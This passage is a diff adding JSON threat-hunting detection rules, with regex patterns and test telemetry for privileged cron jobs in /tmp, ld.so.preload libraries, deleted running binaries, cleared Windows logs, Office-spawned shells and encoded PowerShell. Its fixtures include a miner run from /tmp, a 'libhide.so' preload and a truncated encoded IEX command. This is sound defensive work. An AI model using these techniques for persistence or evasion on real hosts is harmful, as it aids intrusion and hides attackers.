+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "/etc/cron.daily/logrotate",
+                  "command": "/usr/sbin/logrotate /etc/logrotate.conf",
+                  "user": "root"
+                },
+                "scope": "cron"
+              }
+            ]
+          }
+        },
+        {
+          "name": "task coverage unavailable",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:1",
+                "attributes": {
+                  "pid": 1,
+                  "ppid": 0,
+                  "name": "x",
+                  "exe": "/usr/bin/x",
+                  "user": "root",
+                  "cmdline": "x"
+                }
+              }
+            ],
+            "coverage": {
+              "scheduled_task": "unavailable"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HTSK-002",
+      "version": "1.0.0",
+      "name": "Privileged scheduled job running a program from a user-writable location",
+      "description": "A job that runs as root or SYSTEM executes a program under a temporary, home or user-profile directory.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-persistence",
+      "severity": "medium",
+      "severity_reason": "A privileged job that runs a file an ordinary user can modify allows privilege escalation, and an unexpected one may be planted persistence.",
+      "confidence": "medium",
+      "confidence_reason": "The user and path are directly observed; a job's real target may be hidden behind wrapper scripts.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:scheduled_task"
+      ],
+      "clauses": [
+        {
+          "id": "job",
+          "source": "telemetry",
+          "description": "A privileged job with a user-writable target",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "scheduled_task"
+              },
+              {
+                "field": "attrs.user",
+                "op": "in",
+                "value": [
+                  "root",
+                  "SYSTEM",
+                  "NT AUTHORITY\\SYSTEM"
+                ]
+              },
+              {
+                "field": "attrs.command",
+                "op": "regex",
+                "value": "(?i)(^|\\s)(/tmp/|/var/tmp/|/dev/shm/|/home/)|[a-z]:\\\\(users|temp|windows\\\\temp|programdata)\\\\"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{job.attrs.user} job {job.attrs.name} runs a program from a writable location",
+      "rationale": "Privileged execution of a user-controlled file lets whoever can modify the file run code as root or SYSTEM. Whether the job is malicious or merely misconfigured, it needs review.",
+      "false_positives": [
+        "Admin scripts kept in a home directory by convention."
+      ],
+      "confidence_boosters": [
+        "The target was modified recently.",
+        "The target is world-writable."
+      ],
+      "investigation": [
+        "Check who owns and can write the target file.",
+        "Find when the job was created or modified.",
+        "Review the target's content and recent changes."
+      ],
+      "remediation": "Restrict permissions on the target or move it to a protected path; if unauthorised, disable the job per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1053.003",
+            "relationship": "possible",
+            "explanation": "Cron can provide persistence and privilege escalation; this job's intent is not established."
+          },
+          {
+            "id": "T1053.005",
+            "relationship": "possible",
+            "explanation": "Scheduled tasks can provide persistence and privilege escalation; intent is not established."
+          }
+        ],
+        "nist": [
+          "AC-6",
+          "CM-5",
+          "SI-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "root cron running from /tmp",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "/etc/cron.d/j",
+                  "command": "*/10 * * * * root /tmp/run.sh",
+                  "user": "root"
+                },
+                "scope": "cron"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "system task in user profile",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "\\Updater",
+                  "command": "C:\\Users\\bob\\up.exe",
+                  "user": "SYSTEM"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "unprivileged job in home",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "u",
+                  "command": "/home/alice/job.sh",
+                  "user": "alice"
+                },
+                "scope": "cron"
+              }
+            ]
+          }
+        },
+        {
+          "name": "root job in /usr/local",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "j",
+                  "command": "/usr/local/bin/job.sh",
+                  "user": "root"
+                },
+                "scope": "cron"
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-LNX-HPER-001",
+      "version": "1.0.0",
+      "name": "Dynamic-linker preload configured",
+      "description": "/etc/ld.so.preload or a preload mechanism lists a library.",
+      "enabled": true,
+      "platforms": [
+        "linux"
+      ],
+      "category": "hunt-persistence",
+      "severity": "high",
+      "severity_reason": "Preloaded libraries are loaded into every process and are used to hook or hide activity (userland rootkits).",
+      "confidence": "medium",
+      "confidence_reason": "The configuration is directly observed; some security and diagnostic products use preloading.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:persistence"
+      ],
+      "clauses": [
+        {
+          "id": "pre",
+          "source": "telemetry",
+          "description": "A populated preload configuration",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "persistence"
+              },
+              {
+                "field": "attrs.mechanism",
+                "op": "eq",
+                "value": "ld_preload"
+              },
+              {
+                "field": "attrs.value",
+                "op": "present"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Library preloaded via {pre.attrs.location}",
+      "rationale": "A library listed in ld.so.preload runs inside every dynamically linked process. That is rarely needed on a clean server, and it is a known way to conceal processes, files and connections from tools running on the host.",
+      "false_positives": [
+        "Endpoint protection or APM products that preload a library."
+      ],
+      "confidence_boosters": [
+        "The library is outside standard library directories.",
+        "Process or connection counts differ between tools."
+      ],
+      "investigation": [
+        "Identify the library, its package and its hash.",
+        "Compare with the host's baseline.",
+        "Use a static binary or an offline image to look for what the library hides."
+      ],
+      "remediation": "If unauthorised, preserve the file and library as evidence, then restore the configuration from a known good source per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1574.006",
+            "relationship": "possible",
+            "explanation": "Dynamic-linker hijacking can provide persistence and concealment; this configuration's purpose is not established."
+          }
+        ],
+        "nist": [
+          "CM-7",
+          "SI-7",
+          "SI-4"
+        ]
+      },
+      "examples": [
+        {
+          "name": "preload configured",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "persistence",
+                "key": "p1",
+                "attributes": {
+                  "mechanism": "ld_preload",
+                  "location": "/etc/ld.so.preload",
+                  "value": "/usr/lib/libhide.so"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "empty preload",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "persistence",
+                "key": "p1",
+                "attributes": {
+                  "mechanism": "ld_preload",
+                  "location": "/etc/ld.so.preload",
+                  "value": null
+                },
+                "unknown_attributes": [
+                  "value"
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "name": "other mechanism",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "persistence",
+                "key": "p1",
+                "attributes": {
+                  "mechanism": "rc_local",
+                  "location": "/etc/rc.local",
+                  "value": "exit 0"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-LNX-HPRC-003",
+      "version": "1.0.0",
+      "name": "Running program whose executable file has been deleted",
+      "description": "A process is running from an executable that no longer exists on disk.",
+      "enabled": true,
+      "platforms": [
+        "linux"
+      ],
+      "category": "hunt-process",
+      "severity": "medium",
+      "severity_reason": "Deleting the binary of a running program is a way to hide it from file-based inspection; the process keeps running from memory.",
+      "confidence": "medium",
+      "confidence_reason": "The kernel reports the deletion directly, but package upgrades also leave long-running processes on replaced binaries.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:process"
+      ],
+      "clauses": [
+        {
+          "id": "p",
+          "source": "telemetry",
+          "description": "A process whose executable file is deleted",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.exe_deleted",
+                "op": "is_true"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{p.attrs.name} (pid {p.attrs.pid}) runs from a deleted file",
+      "rationale": "A process whose backing file was removed cannot be examined by hashing the file. Package upgrades produce the same state until the service restarts, which is why the rule is an indicator and not a conclusion.",
+      "false_positives": [
+        "Services not restarted after a package upgrade.",
+        "Programs run from a build directory that was cleaned up."
+      ],
+      "confidence_boosters": [
+        "Owner is not a system account.",
+        "The executable was in a temporary directory before deletion."
+      ],
+      "investigation": [
+        "Check whether the package manager replaced the program recently (needs-restart tooling, package logs).",
+        "Recover the image from /proc/<pid>/exe as evidence if it is not a known upgrade.",
+        "Look at the parent, user and network connections of the process."
+      ],
+      "remediation": "If unexplained, recover the image for analysis (copy, then hash), then contain per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1070.004",
+            "relationship": "possible",
+            "explanation": "File deletion can hide a running program; the data does not show who deleted it or why."
+          }
+        ],
+        "nist": [
+          "SI-4",
+          "SI-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "deleted binary",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "p1",
+                "attributes": {
+                  "pid": 9,
+                  "name": "xmrig",
+                  "exe": "/tmp/xmrig",
+                  "exe_deleted": true,
+                  "user": "www-data"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "normal process",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:9",
+                "attributes": {
+                  "pid": 9,
+                  "ppid": 1,
+                  "name": "cron",
+                  "exe": "/usr/bin/cron",
+                  "user": "root",
+                  "cmdline": "cron"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "windows is not applicable",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:9",
+                "attributes": {
+                  "pid": 9,
+                  "ppid": 4,
+                  "name": "svchost.exe",
+                  "exe": "/usr/bin/svchost.exe",
+                  "user": "root",
+                  "cmdline": "svchost.exe"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-WIN-HAUTH-005",
+      "version": "1.0.0",
+      "name": "Security log cleared",
+      "description": "An event shows that the Windows Security or System log was cleared.",
+      "enabled": true,
+      "platforms": [
+        "windows"
+      ],
+      "category": "hunt-auth",
+      "severity": "high",
+      "severity_reason": "Clearing the audit log removes history and is a classic defence-evasion step.",
+      "confidence": "high",
+      "confidence_reason": "The event is recorded by the log itself; routine maintenance also clears logs.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:security_event"
+      ],
+      "clauses": [
+        {
+          "id": "clr",
+          "source": "telemetry",
+          "description": "A log-cleared event",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "security_event"
+              },
+              {
+                "field": "attrs.event_id",
+                "op": "in",
+                "value": [
+                  "1102",
+                  "104"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Log cleared (event {clr.attrs.event_id})",
+      "rationale": "Event 1102 (Security) and 104 (System) are written when a log is cleared. Because the log itself records the act, the event is reliable, but who cleared it and why must come from the event's actor and surrounding activity.",
+      "false_positives": [
+        "Scheduled maintenance or disk-space housekeeping."
+      ],
+      "confidence_boosters": [
+        "The actor is not an administrator you expect.",
+        "Activity of interest immediately before the clear."
+      ],
+      "investigation": [
+        "Identify the account and process that cleared the log.",
+        "Look at what happened just before the clear.",
+        "Check whether forwarded copies of the log exist.",
+        "Verify whether maintenance was planned."
+      ],
+      "remediation": "Preserve what remains of the logs and any forwarded copies, then investigate the actor per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1070.001",
+            "relationship": "possible",
+            "explanation": "Clearing Windows event logs matches this technique; intent is not established by the event alone."
+          }
+        ],
+        "nist": [
+          "AU-9",
+          "AU-6",
+          "SI-4"
+        ]
+      },
+      "examples": [
+        {
+          "name": "security log cleared",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "security_event",
+                "key": "ev1",
+                "attributes": {
+                  "event_id": "1102",
+                  "source": "Security",
+                  "summary": "audit log cleared"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "ordinary logon event",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "security_event",
+                "key": "ev2",
+                "attributes": {
+                  "event_id": "4672",
+                  "source": "Security"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "event log unavailable",
+          "expect": "indeterminate",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:1",
+                "attributes": {
+                  "pid": 1,
+                  "ppid": 0,
+                  "name": "x.exe",
+                  "exe": "/usr/bin/x.exe",
+                  "user": "root",
+                  "cmdline": "x.exe"
+                }
+              }
+            ],
+            "coverage": {
+              "security_event": "unavailable"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-WIN-HPRC-005",
+      "version": "1.0.0",
+      "name": "Script host started by an Office application",
+      "description": "A command interpreter or script host has an Office application as its parent.",
+      "enabled": true,
+      "platforms": [
+        "windows"
+      ],
+      "category": "hunt-process",
+      "severity": "high",
+      "severity_reason": "Office documents with macros or exploits commonly launch interpreters to fetch and run further code.",
+      "confidence": "medium",
+      "confidence_reason": "The relationship is directly observed; some documents legitimately automate with scripts.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:process"
+      ],
+      "clauses": [
+        {
+          "id": "sh",
+          "source": "telemetry",
+          "description": "A script host started by an Office application",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.name",
+                "op": "in",
+                "value": [
+                  "cmd.exe",
+                  "powershell.exe",
+                  "pwsh.exe",
+                  "wscript.exe",
+                  "cscript.exe",
+                  "mshta.exe",
+                  "rundll32.exe",
+                  "regsvr32.exe"
+                ]
+              },
+              {
+                "field": "process.parent_name",
+                "op": "in",
+                "value": [
+                  "winword.exe",
+                  "excel.exe",
+                  "powerpnt.exe",
+                  "outlook.exe",
+                  "onenote.exe",
+                  "msaccess.exe"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{sh.attrs.name} started by {sh.process.parent_name}",
+      "rationale": "Office applications rarely need to start a shell or script host; when they do it is usually document-borne code. Legitimate automation exists, so the document and user context decide.",
+      "false_positives": [
+        "Finance/reporting macros that call cmd or PowerShell.",
+        "Add-ins that launch helper scripts."
+      ],
+      "confidence_boosters": [
+        "Encoded or download-style command lines.",
+        "A connection from the child to an external address."
+      ],
+      "investigation": [
+        "Identify the document that was open and where it came from.",
+        "Read the child's command line.",
+        "Check the child's own network connections and descendants.",
+        "Review mail or download records for the document."
+      ],
+      "remediation": "If malicious, isolate the host and remove the document and any dropped payloads per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1204.002",
+            "relationship": "possible",
+            "explanation": "A user-opened document may have launched the interpreter; the data does not show the document's content."
+          },
+          {
+            "id": "T1059",
+            "relationship": "possible",
+            "explanation": "An interpreter is running; intent is not established."
+          }
+        ],
+        "nist": [
+          "SI-3",
+          "SI-4"
+        ]
+      },
+      "examples": [
+        {
+          "name": "powershell under winword",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:10",
+                "attributes": {
+                  "pid": 10,
+                  "ppid": 4,
+                  "name": "winword.exe",
+                  "exe": "C:\\Program Files\\Office\\winword.exe",
+                  "user": "bob",
+                  "cmdline": "winword.exe"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:11",
+                "attributes": {
+                  "pid": 11,
+                  "ppid": 10,
+                  "name": "powershell.exe",
+                  "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                  "user": "bob",
+                  "cmdline": "powershell.exe"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "powershell under explorer",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:10",
+                "attributes": {
+                  "pid": 10,
+                  "ppid": 4,
+                  "name": "explorer.exe",
+                  "exe": "/usr/bin/explorer.exe",
+                  "user": "root",
+                  "cmdline": "explorer.exe"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:11",
+                "attributes": {
+                  "pid": 11,
+                  "ppid": 10,
+                  "name": "powershell.exe",
+                  "exe": "/usr/bin/powershell.exe",
+                  "user": "root",
+                  "cmdline": "powershell.exe"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "not applicable on linux",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:10",
+                "attributes": {
+                  "pid": 10,
+                  "ppid": 1,
+                  "name": "winword.exe",
+                  "exe": "/usr/bin/winword.exe",
+                  "user": "root",
+                  "cmdline": "winword.exe"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:11",
+                "attributes": {
+                  "pid": 11,
+                  "ppid": 10,
+                  "name": "cmd.exe",
+                  "exe": "/usr/bin/cmd.exe",
+                  "user": "root",
+                  "cmdline": "cmd.exe"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-WIN-HPRC-006",
+      "version": "1.0.0",
+      "name": "PowerShell started with an encoded command",
+      "description": "A PowerShell process was started with -EncodedCommand (or an abbreviation) and a long Base64 argument.",
+      "enabled": true,
+      "platforms": [
+        "windows"
+      ],
+      "category": "hunt-process",
+      "severity": "medium",
+      "severity_reason": "Encoded commands hide the script text from casual inspection and are common in malicious use, although management tools also use them.",
+      "confidence": "medium",
+      "confidence_reason": "The command line is directly observed; the content is not decoded here.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:process"
+      ],
+      "clauses": [
+        {
+          "id": "ps",
+          "source": "telemetry",
+          "description": "A PowerShell process with an encoded command argument",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.name",
+                "op": "in",
+                "value": [
+                  "powershell.exe",
+                  "pwsh.exe"
+                ]
+              },
+              {
+                "field": "attrs.cmdline",
+                "op": "regex",
+                "value": "(?i)\\s-(e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\\s+[A-Za-z0-9+/=]{20,}"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Encoded PowerShell command (pid {ps.attrs.pid})",
+      "rationale": "Base64-encoded PowerShell is a standard way to pass a script on a command line. The same mechanism is used by configuration management and installers, so the parent process and the decoded content decide the verdict. The command line is truncated by the collector and may be redacted.",
+      "false_positives": [
+        "Software deployment and monitoring agents.",
+        "Administrators using -EncodedCommand to avoid quoting problems."
+      ],
+      "confidence_boosters": [
+        "Parent is an Office application, a script host or a service.",
+        "The decoded text downloads or executes further content."
+      ],
+      "investigation": [
+        "Decode the argument offline (it is Base64 of UTF-16LE text).",
+        "Check the parent process and the account that ran it.",
+        "Look for PowerShell script-block logging records for the same time."
+      ],
+      "remediation": "If malicious, contain per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1059.001",
+            "relationship": "possible",
+            "explanation": "PowerShell is running; whether it is adversary activity is not established."
+          },
+          {
+            "id": "T1027",
+            "relationship": "possible",
+            "explanation": "Encoding can hide content; here it may simply be a quoting convenience."
+          }
+        ],
+        "nist": [
+          "SI-4",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "encoded command",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "p1",
+                "attributes": {
+                  "pid": 1,
+                  "name": "powershell.exe",
+                  "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                  "cmdline": "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "plain script file",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "p1",
+                "attributes": {
+                  "pid": 1,
+                  "name": "powershell.exe",
+                  "cmdline": "powershell.exe -File C:\\ops\\backup.ps1"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "short value is not an encoded payload",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "p1",
+                "attributes": {
+                  "pid": 1,
+                  "name": "powershell.exe",
+                  "cmdline": "powershell.exe -e abc"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    }
+  ]
+}
